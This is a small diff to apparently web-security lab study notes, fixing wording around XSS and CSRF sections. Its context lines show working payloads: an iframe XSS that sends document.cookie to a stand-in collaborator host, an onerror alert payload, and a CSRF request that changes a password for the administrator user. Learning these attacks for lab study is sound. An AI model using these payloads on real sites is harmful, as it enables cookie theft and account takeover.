@@ -178,7 +178,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 <iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
 ```  
 
->Following iframe uses *hash** character to trigger the OnHashChange **'#'** XSS  
+>Following iframe uses **hash** character to trigger the OnHashChange **'#'** XSS.  
   
 ```JavaScript
 <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
@@ -612,7 +612,7 @@ Connection: close
 
 ## Password Refresh CSRF  
   
->Refresh password POST request,then change username parameter to administrator while logged in as low priv user, CSRF where token is not tied to user session.  
+>Refresh password POST request, then change username parameter to administrator while logged in as low priv user, CSRF where token is not tied to user session.  
 
 ```html
 POST /refreshpassword HTTP/1.1
@@ -1279,7 +1279,7 @@ Content-Type: text/html; charset=utf-8
 Referrer-Policy: unsafe-url
 ```  
 
-<sub>**Note:** that unlike the normal Referer header, the word **"referrer"** must be spelled correctly.</sub>  
+>**Note:** Unlike the normal Referer header spelling, the word **"referrer"** must be spelled correctly in the above code^^.  
 
 >Create a CSRF proof of concept exploit and host it on the exploit server. Edit the JavaScript so that the third argument of the **history.pushState()** function includes a query string with target URL.  
 
